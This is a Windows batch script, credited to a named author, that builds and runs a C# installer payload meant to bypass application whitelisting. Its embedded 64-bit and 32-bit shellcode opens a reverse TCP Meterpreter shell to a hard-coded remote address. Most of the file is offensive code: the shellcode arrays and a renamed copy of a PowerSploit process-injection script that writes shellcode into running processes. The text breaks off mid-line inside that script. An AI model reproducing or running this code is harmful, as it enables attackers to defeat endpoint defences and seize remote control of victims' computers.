:Author - Brian Fehrman (@fullmetalcache)
:Date - 2016-09-19
:Purpose - Create, compile, and run a C# program in a way
:           that attempts to bypass application whitelisting
:           software. It currently establishes a reverse_tcp
:           meterpreter session with a remote server, but could
:           be utilized for many other purposes.


@echo off

:clear variables
set "bytecode="
set "fbeg1="
set "fbeg2="
set "fbeg3="
set "fbeg4="
set "fend="
set "_Bitness="

:determine arch
set _Bitness=64

IF %PROCESSOR_ARCHITECTURE% == x86 (
  IF NOT DEFINED PROCESSOR_ARCHITEW6432 Set _Bitness=
)

if %_Bitness% == 64 (
    :64 bit tcp 443
    set bytecode=[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0;$buf += 0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2;$buf += 0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48;$buf += 0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7;$buf += 0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c;$buf += 0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41;$buf += 0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52;$buf += 0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78;$buf += 0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b;$buf += 0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67;$buf += 0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40;$buf += 0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41;$buf += 0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48;$buf += 0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1;$buf += 0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45;$buf += 0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49;$buf += 0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40;$buf += 0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1;$buf += 0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58;$buf += 0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52;$buf += 0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9;$buf += 0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32;$buf += 0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6;$buf += 0x48,0x81,0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5;$buf += 0x49,0xbc,0x2,0x0,0x1,0xbb,0x18,0x6f,0x1,0x8b;$buf += 0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba;$buf += 0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68;$buf += 0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b;$buf += 0x0,0xff,0xd5,0x6a,0x5,0x41,0x5e,0x50,0x50,0x4d;$buf += 0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89;$buf += 0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea;$buf += 0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10;$buf += 0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba;$buf += 0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xa;$buf += 0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x0,0x0,0x0;$buf += 0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9;$buf += 0x6a,0x4,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x2;$buf += 0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x55;$buf += 0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41;$buf += 0x59,0x68,0x0,0x10,0x0,0x0,0x41,0x58,0x48,0x89;$buf += 0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5;$buf += 0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31;$buf += 0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9;$buf += 0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8;$buf += 0x0,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x0,0x40;$buf += 0x0,0x0,0x41,0x58,0x6a,0x0,0x5a,0x41,0xba,0xb;$buf += 0x2f,0xf,0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75;$buf += 0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c;$buf += 0xff,0xff,0xff,0x48,0x1,0xc3,0x48,0x29,0xc6,0x48;$buf += 0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,0x6a,0x0;$buf += 0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5;
) else (
    :32 bit tcp 80
    set bytecode=[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31;$buf += 0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52;$buf += 0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff;$buf += 0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd;$buf += 0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b;$buf += 0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1;$buf += 0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3;$buf += 0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac;$buf += 0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3;$buf += 0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58;$buf += 0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c;$buf += 0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24;$buf += 0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f;$buf += 0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32;$buf += 0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c;$buf += 0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0;$buf += 0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff;$buf += 0xd5,0x6a,0x5,0x68,0x18,0x6f,0x1,0x8b,0x68,0x2;$buf += 0x0,0x0,0x50,0x89,0xe6,0x50,0x50,0x50,0x50,0x40;$buf += 0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5;$buf += 0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61;$buf += 0xff,0xd5,0x85,0xc0,0x74,0xa,0xff,0x4e,0x8,0x75;$buf += 0xec,0xe8,0x61,0x0,0x0,0x0,0x6a,0x0,0x6a,0x4;$buf += 0x56,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83;$buf += 0xf8,0x0,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x0;$buf += 0x10,0x0,0x0,0x56,0x6a,0x0,0x68,0x58,0xa4,0x53;$buf += 0xe5,0xff,0xd5,0x93,0x53,0x6a,0x0,0x56,0x53,0x57;$buf += 0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0;$buf += 0x7d,0x22,0x58,0x68,0x0,0x40,0x0,0x0,0x6a,0x0;$buf += 0x50,0x68,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x68;$buf += 0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0xc;$buf += 0x24,0xe9,0x71,0xff,0xff,0xff,0x1,0xc3,0x29,0xc6;$buf += 0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x0;$buf += 0x53,0xff,0xd5;

)

:create/clean directories and files
if not exist "C:\temp" mkdir C:\temp
if exist "C:\temp\inv.cs" del C:\temp\inv.cs

:build the string variables that are used to create the c# file
:string size is limited and is the reason for multiple variables
:if you want to torture yourself, play around with escaping characters
:and outputing strings to a file correctly. there's probably and easier way...
setlocal EnableDelayedExpansion

set fbeg1=using System; using System.Configuration.Install; using System.Runtime.InteropServices; using System.Management.Automation.Runspaces; public class Program { public static void Main(^) { } } [System.ComponentModel.RunInstaller(true^)] public class Sample : System.Configuration.Install.Installer { public override void Uninstall(System.Collections.IDictionary savedState^) {   Mycode.Exec(^); } } public class Mycode { public static void Exec(^) {    string command=""function Invoke-Mine\n{\n^<#\n.SYNOPSIS\n\nInject shellcode into the process ID of your choosing or within the context of the running PowerShell process.\n\nPowerSploit Function: Invoke-Mine\nAuthor: Matthew Graeber (@mattifestation^)\nLicense: BSD 3-Clause\nRequired Dependencies: None\nOptional Dependencies: None\n \n.DESCRIPTION\n\nPortions of this project was based upon syringe.c v1.2 written by Spencer McIntyre\n\nPowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Backtrack (Thanks, Matt and g0tm1lk^):\n\nmsfpayload windows/exec CMD=\""cmd /k calc\"" EXITFUNC=thread C ^| sed '1,6d;s/[\"";]//g;s/\\\\/,0/g' ^| tr -d '\\n' ^| cut -c2- \n\nMake sure to specify 'thread' for your exit process. Also, don't bother encoding your shellcode. It's entirely unnecessary.\n \n.PARAMETER ProcessID\n\nProcess ID of the process you want to inject shellcode into.\n\n.PARAMETER Shellcode\n\nSpecifies an optional shellcode passed in as a byte array\n\n.PARAMETER Force\n\nInjects shellcode without prompting for confirmation. By default, Invoke-Mine prompts for confirmation before performing any malicious act.\n\n.EXAMPLE\n\nC:\\PS^> Invoke-Mine -ProcessId 4274\n\nDescription\n-----------\nInject shellcode into process ID 4274.\n\n.EXAMPLE\n\nC:\\PS^> Invoke-Mine\n\nDescription\n-----------\nInject shellcode into the running instance of PowerShell.\n\n.EXAMPLE\n\nC:\\PS^> Invoke-Mine -Shellcode @(0x90,0x90,0xC3^)\n    \nDescription\n-----------\nOverrides the shellcode included in the script with custom shellcode - 0x90 (NOP^), 0x90 (NOP^), 0xC3 (RET^)\nWarning: This script has no way to validate that your shellcode is 32 vs. 64-bit^^^!\n#^>\n\n[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High'^)] Param (\n    [ValidateNotNullOrEmpty(^)]\n    [UInt16]\n    $ProcessID,\n    \n    [Parameter( ParameterSetName = 'RunLocal' ^)]\n    [ValidateNotNullOrEmpty(^)]\n    [Byte[]]\n    $Shellcode,\n    \n    [Switch]\n    
set fbeg2=$Force = $False\n^)\n\n    Set-StrictMode -Version 2.0\n\n    if ( $PSBoundParameters['ProcessID'] ^)\n    {\n        # Ensure a valid process ID was provided\n        # This could have been validated via 'ValidateScript' but the error generated with Get-Process is more descriptive\n        Get-Process -Id $ProcessID -ErrorAction Stop ^| Out-Null\n    }\n    \n    function Local:Get-DelegateType\n    {\n        Param\n        (\n            [OutputType([Type]^)]\n            \n            [Parameter( Position = 0^)]\n            [Type[]]\n            $Parameters = (New-Object Type[](0^)^),\n            \n            [Parameter( Position = 1 ^)]\n            [Type]\n            $ReturnType = [Void]\n        ^)\n\n        $Domain = [AppDomain]::CurrentDomain\n        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate'^)\n        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run^)\n        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false^)\n        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]^)\n        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters^)\n        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed'^)\n        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters^)\n        $MethodBuilder.SetImplementationFlags('Runtime, Managed'^)\n        \n        Write-Output $TypeBuilder.CreateType(^)\n    }\n\n    function Local:Get-ProcAddress\n    {\n        Param\n        (\n            [OutputType([IntPtr]^)]\n        \n            [Parameter( Position = 0, Mandatory = $True ^)]\n            [String]\n            $Module,\n            \n            [Parameter( Position = 1, Mandatory = $True ^)]\n            [String]\n            $Procedure\n        ^)\n\n        # Get a reference to System.dll in the GAC\n        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies(^) ^|\n            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\'^)[-1].Equals('System.dll'^) }\n        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods'^)\n        # Get a reference to the GetModuleHandle and GetProcAddress methods\n        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle'^)\n        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress'^)\n        # Get a handle to the module specified\n        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module^)^)\n        $tmpPtr = New-Object IntPtr\n        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle^)\n        \n        # Return the address of the function\n        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure^)^)\n    }\n\n    # Emits a shellcode stub that when injected will create a thread and pass execution to the main shellcode payload\n    function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture^)\n    {\n        $IntSizePtr = $Architecture / 8\n\n        function Local:ConvertTo-LittleEndian ([IntPtr] $Address^)\n        {\n            $LittleEndianByteArray = New-Object Byte[](0^)\n            $Address.ToString(\""X$($IntSizePtr*2^)\""^) -split '([A-F0-9]{2}^)' ^| ForEach-Object { if ($_^) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_^) } }\n            [System.Array]::Reverse($LittleEndianByteArray^)\n            \n            Write-Output $LittleEndianByteArray\n        }\n        \n        $CallStub = New-Object Byte[](0^)\n        \n        if ($IntSizePtr -eq 8^)\n        {\n            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, ^&shellcode\n            $CallStub += ConvertTo-LittleEndian $BaseAddr       # ^&shellcode\n            $CallStub += 0xFF,0xD0                              # CALL  RAX\n            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0\n            $CallStub += 0x48,0xB8                              # MOV   QWORD RAX, ^&ExitThread\n            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # ^&ExitThread\n            $CallStub += 0xFF,0xD0                              # CALL  RAX\n        }\n        else\n        {\n            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, ^&shellcode\n            $CallStub += ConvertTo-LittleEndian $BaseAddr       # ^&shellcode\n            $CallStub += 0xFF,0xD0                              # CALL  EAX\n            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0\n            $CallStub += 0xB8                                   # MOV   DWORD EAX, ^&ExitThread\n            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # ^&ExitThread\n            $CallStub += 0xFF,0xD0                              # CALL  EAX\n        }\n        \n        Write-Output $CallStub\n    }\n\n    function Local:Inject-RemoteShellcode ([Int] $ProcessID^)\n    {\n        # Open a handle to the process you want to inject into\n        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID^) # ProcessAccessFlags.All (0x001F0FFF^)\n        \n        if (^^^!$hProcess^)\n        {\n            Throw \""Unable to open a process handle for PID: $ProcessID\""\n        }\n\n        $IsWow64 = $false\n\n        if ($64bitOS^) # Only perform theses checks if CPU is 64-bit\n        {\n            # Determine if the process specified is 32 or 64 bit\n            $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64^) ^| Out-Null\n            \n            if ((^^^!$IsWow64^) -and $PowerShell32bit^)\n            {\n                Throw 'Shellcode injection targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'\n            }\n            elseif ($IsWow64^) # 32-bit Wow64 process\n            {\n                if ($Shellcode32.Length -eq 0^)\n                {\n                    Throw 'No shellcode was placed in the $Shellcode32 variable^^^!'\n                }\n                \n                $Shellcode = $Shellcode32\n                Write-Verbose 'Injecting into a Wow64 process.'\n                Write-Verbose 'Using 32-bit shellcode.'\n            }\n            
set fbeg3=else # 64-bit process\n            {\n                if ($Shellcode64.Length -eq 0^)\n                {\n                    Throw 'No shellcode was placed in the $Shellcode64 variable^^^!'\n                }\n                \n                $Shellcode = $Shellcode64\n                Write-Verbose 'Using 64-bit shellcode.'\n            }\n        }\n        else # 32-bit CPU\n        {\n            if ($Shellcode32.Length -eq 0^)\n            {\n                Throw 'No shellcode was placed in the $Shellcode32 variable^^^!'\n            }\n            \n            $Shellcode = $Shellcode32\n            Write-Verbose 'Using 32-bit shellcode.'\n        }\n\n        # Reserve and commit enough memory in remote process to hold the shellcode\n        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40^) # (Reserve^|Commit, RWX^)\n        \n        if (^^^!$RemoteMemAddr^)\n        {\n            Throw \""Unable to allocate shellcode memory in PID: $ProcessID\""\n        }\n        \n        Write-Verbose \""Shellcode memory reserved at 0x$($RemoteMemAddr.ToString(\""X$([IntPtr]::Size*2^)\""^)^)\""\n\n        # Copy shellcode into the previously allocated memory\n        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0^) ^| Out-Null\n\n        # Get address of ExitThread function\n        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread\n\n        if ($IsWow64^)\n        {\n            # Build 32-bit inline assembly stub to call the shellcode upon creation of a remote thread.\n            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32\n            \n            Write-Verbose 'Emitting 32-bit assembly call stub.'\n        }\n        else\n        {\n            # Build 64-bit inline assembly stub to call the shellcode upon creation of a remote thread.\n            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64\n            \n            Write-Verbose 'Emitting 64-bit assembly call stub.'\n        }\n\n        # Allocate inline assembly stub\n        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40^) # (Reserve^|Commit, RWX^)\n        \n        if (^^^!$RemoteStubAddr^)\n        {\n            Throw \""Unable to allocate thread call stub memory in PID: $ProcessID\""\n        }\n        \n        Write-Verbose \""Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString(\""X$([IntPtr]::Size*2^)\""^)^)\""\n\n        # Write 32-bit assembly stub to remote process memory space\n        $WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0^) ^| Out-Null\n\n        # Execute shellcode as a remote thread\n        $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero^)\n        \n        if (^^^!$ThreadHandle^)\n        {\n            Throw \""Unable to launch remote thread in PID: $ProcessID\""\n        }\n\n        # Close process handle\n        $CloseHandle.Invoke($hProcess^) ^| Out-Null\n\n        Write-Verbose 'Shellcode injection complete^^^!'\n    }\n\n    function Local:Inject-LocalShellcode\n    {\n        if ($PowerShell32bit^) {\n            if ($Shellcode32.Length -eq 0^)\n            {\n                Throw 'No shellcode was placed in the $Shellcode32 variable^^^!'\n                return\n            }\n            \n            $Shellcode = $Shellcode32\n            Write-Verbose 'Using 32-bit shellcode.'\n        }\n        else\n        {\n            if ($Shellcode64.Length -eq 0^)\n            {\n                Throw 'No shellcode was placed in the $Shellcode64 variable^^^!'\n                return\n            }\n            \n            $Shellcode = $Shellcode64\n            Write-Verbose 'Using 64-bit shellcode.'\n        }\n    \n        # Allocate RWX memory for the shellcode\n        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40^) # (Reserve^|Commit, RWX^)\n        if (^^^!$BaseAddress^)\n        {\n            Throw \""Unable to allocate shellcode memory in PID: $ProcessID\""\n        }\n        \n        Write-Verbose \""Shellcode memory reserved at 0x$($BaseAddress.ToString(\""X$([IntPtr]::Size*2^)\""^)^)\""\n\n        # Copy shellcode to RWX buffer\n        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length^)\n        \n        # Get address of ExitThread function\n        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread\n        \n        if ($PowerShell32bit^)\n        {\n            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32\n            \n            Write-Verbose 'Emitting 32-bit assembly call stub.'\n        }\n        else\n        {\n            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64\n            \n            Write-Verbose 'Emitting 64-bit assembly call stub.'\n        }\n\n        # Allocate RWX memory for the thread call stub\n        $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40^) # (Reserve^|Commit, RWX^)\n        if (^^^!$CallStubAddress^)\n        {\n            Throw \""Unable to allocate thread call stub.\""\n        }\n        \n        Write-Verbose \""Thread call stub memory reserved at 0x$($CallStubAddress.ToString(\""X$([IntPtr]::Size*2^)\""^)^)\""\n\n        # Copy call stub to RWX buffer\n        [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length^)\n\n        # Launch shellcode in it's own thread\n        $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero^)\n        if (^^^!$ThreadHandle^)\n        {\n            Throw \""Unable to launch thread.\""\n        }\n\n        # Wait for shellcode thread to terminate\n        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF^) ^| Out-Null\n        \n        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000^) ^| Out-Null # MEM_RELEASE (0x8000^)\n        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000^) ^| Out-Null # MEM_RELEASE (0x8000^)\n\n        Write-Verbose 'Shellcode injection complete^^^!'\n    }\n\n    # A valid pointer to IsWow64Process will be returned if CPU is 64-bit\n    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process\n\n    $AddressWidth = $null\n\n    try {\n        $AddressWidth = @(Get-WmiObject -Query 'SELECT AddressWidth FROM Win32_Processor'^)[0] ^| Select-Object -ExpandProperty AddressWidth\n    } catch {\n        throw 'Unable to determine OS processor address width.'\n    }\n\n    switch ($AddressWidth^) {\n        '32' {\n            $64bitOS = $False\n        }\n\n        '64' {\n            $64bitOS = $True\n\n            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType(^)^) ([Bool]^)\n          $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate^)\n        }\n\n        default {\n            throw 'Invalid OS address width detected.'\n        }\n    }\n\n    if ([IntPtr]::Size -eq 4^)\n    {\n        $PowerShell32bit = $true\n    }\n    else\n    {\n        $PowerShell32bit = $false\n    }\n\n    if ($PSBoundParameters['Shellcode']^)\n    {\n        # Users passing in shellcode  through the '-Shellcode' parameter are responsible for ensuring it targets\n        # the correct architechture - x86 vs. x64. This script has no way to validate what you provide it.\n        [Byte[]] $Shellcode32 = $Shellcode\n        [Byte[]] $Shellcode64 = $Shellcode32\n    }\n    else\n    {\n        # Pop a calc... or whatever shellcode you decide to place in here\n        # I sincerely hope you trust that this shellcode actually pops a calc...\n        # Insert your shellcode here in the for 0xXX,0xXX,...\n        # 32-bit payload\n        # msfpayload windows/exec CMD=\""cmd /k calc\"" EXITFUNC=thread\n        [Byte[]] $Shellcode32 = @(
set fbeg4=0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,\n                                  0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,\n                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,\n                                  0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,\n                                  0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,\n                                  0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,\n                                  0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,\n                                  0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,\n                                  0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,\n                                  0x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,\n                                  0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,\n                                  0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,\n                                  0x61,0x6c,0x63,0x00^)\n\n        # 64-bit payload\n        # msfpayload windows/x64/exec CMD=\""calc\"" EXITFUNC=thread\n        [Byte[]] $Shellcode64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,\n                                  0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,\n                                  0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,\n                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,\n                                  0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,\n                                  0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,\n                                  0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,\n                                  0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,\n                                  0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,\n                                  0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,\n                                  0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,\n                                  0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,\n                                  0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,\n                                  0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,\n                                  0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,\n                                  0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,\n                                  0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00^)\n    }\n\n    if ( $PSBoundParameters['ProcessID'] ^)\n    {\n        # Inject shellcode into the specified process ID\n        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess\n        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]^) ([IntPtr]^)\n        $OpenProcess = 